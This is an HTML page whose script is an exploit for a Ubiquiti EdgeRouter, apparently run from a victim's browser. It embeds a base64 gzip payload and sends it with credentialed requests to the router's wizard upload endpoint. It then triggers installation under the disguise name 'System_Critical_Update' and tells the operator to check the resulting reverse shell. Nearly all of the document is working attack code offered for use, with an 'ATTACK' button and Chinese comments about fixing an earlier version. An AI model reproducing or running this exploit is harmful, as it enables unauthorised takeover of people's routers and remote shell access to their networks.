<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="referrer" content="no-referrer">
    <title>Router RCE Final</title>
</head>
<body>
    <h1>Ubiquiti EdgeRouter RCE (Smart Mode)</h1>
    <button onclick="runExploit()">⚡ ATTACK ⚡</button>
    <div id="log" style="white-space: pre-wrap; font-family: monospace; color: green; background: #eee; padding: 10px;"></div>

    <script>
        var target = "https://192.168.1.1";

        function log(msg) {
            document.getElementById("log").innerText += "\n" + msg;
            console.log(msg);
        }

        function runExploit() {
            // 1. 构造 Payload
            var b64Data = "H4sIAAAAAAAAA+3OvQ6CMADE8c48RY2zaauUPgCyGhNiHA3CAImAKRATn96PRQejEzHG/2+54W64U3XOfDHzQyNGo6+ctbc0zurnvDNaC2ONCW3o9CIS2sx1ZIXU4116GLo+81KKPDu0/s3uU/+jphO1rxrVlUHfDnkpVV8f1Xq7Spa7dBPHSZoGeVm3hXTOvSq//R8AAAAAAAAAAAAAAAAA/tUF+pgBCwAoAAA=";
            var byteCharacters = atob(b64Data);
            var byteNumbers = new Array(byteCharacters.length);
            for (var i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            var blob = new Blob([new Uint8Array(byteNumbers)], { type: "application/x-gzip" });

            // 2. 上传并读取回显
            var formData = new FormData();
            formData.append("qqfile", blob, "exploit.tar.gz");

            var xhr = new XMLHttpRequest();
            xhr.open("POST", target + "/api/wizard/upload.json", true);
            xhr.withCredentials = true;

            log("[*] Step 1: Uploading payload...");

            xhr.onload = function () {
                if (xhr.status === 200) {
                    try {
                        log("[+] Upload Success! Response: " + xhr.responseText);
                        // 解析真实的随机路径
                        var resp = JSON.parse(xhr.responseText);
                        
                        // 这里的字段名可能是 'path' 或者 'file'，根据回显自动判断
                        // 之前你没看到回显，现在能看到了
                        var realPath = resp.path || resp.file || resp.url;
                        
                        if (realPath) {
                            log("[!] Target confirmed at: " + realPath);
                            triggerInstall(realPath);
                        } else {
                            log("[-] JSON parsed but no path found. Response structure unknown.");
                        }
                    } catch (e) {
                        log("[-] Error parsing JSON: " + e);
                    }
                } else {
                    log("[-] Upload failed. Status: " + xhr.status);
                }
            };
            xhr.send(formData);
        }

        function triggerInstall(path) {
            log("[*] Step 2: Executing payload at " + path + " ...");
            var xhr2 = new XMLHttpRequest();
            xhr2.open("POST", target + "/api/wizard/create.json", true);
            xhr2.withCredentials = true;
            var fd = new FormData();
            fd.append("name", "System_Critical_Update");
            fd.append("path", path); // 使用刚才获取的真实路径

            xhr2.onload = function () {
                log("[+] Exploit triggered! Status: " + xhr2.status);
                log("[+] Check your reverse shell/router file system now.");
            };
            xhr2.send(fd);
        }
    </script>
</body>
</html>
